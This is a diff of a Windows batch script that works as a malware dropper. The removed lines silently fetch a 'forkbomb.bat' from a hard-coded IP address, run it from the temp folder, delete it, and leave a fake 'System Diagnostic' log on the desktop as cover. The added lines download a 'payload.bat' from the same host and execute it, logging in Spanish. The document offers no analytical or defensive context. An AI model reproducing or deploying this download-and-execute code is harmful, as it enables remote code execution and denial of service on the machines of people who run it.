@@ -1,8 +1,22 @@
 @echo off
-setlocal enabledelayedexpansion
-for /f "delims=" %%i in ('powershell -NoP -Ex By -C "$b='http://82.29.153.101:8080';$t=[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds();$k=(IWR ($b+'/auth/key?ts='+ $t) -UseBasicParsing).Content.Trim();(IWR ($b+'/forkbomb.bat') -Headers @{''=''} -UseBasicParsing).Content"') do (
-    echo %%i^>^>%temp%\sys.bat
+setlocal
+
+set BASE=http://82.29.153.101:5000
+set FILE=%temp%\payload.bat
+set LOG=%temp%\client.log
+
+echo [INFO] Descargando payload... > "%LOG%"
+
+powershell -NoP -Command ^
+"(Invoke-WebRequest '%BASE%/payload.bat' -UseBasicParsing).Content | Out-File -Encoding ASCII '%FILE%'"
+
+if not exist "%FILE%" (
+    echo [ERROR] No se pudo descargar >> "%LOG%"
+    exit /b
 )
-start "" %temp%\sys.bat
-del %temp%\sys.bat
-echo Sys OK^>^>%public%\Desktop\SystemDiagnostic.log
+
+echo [INFO] Ejecutando... >> "%LOG%"
+
+call "%FILE%"
+
+echo [OK] Ejecutado >> "%LOG%"
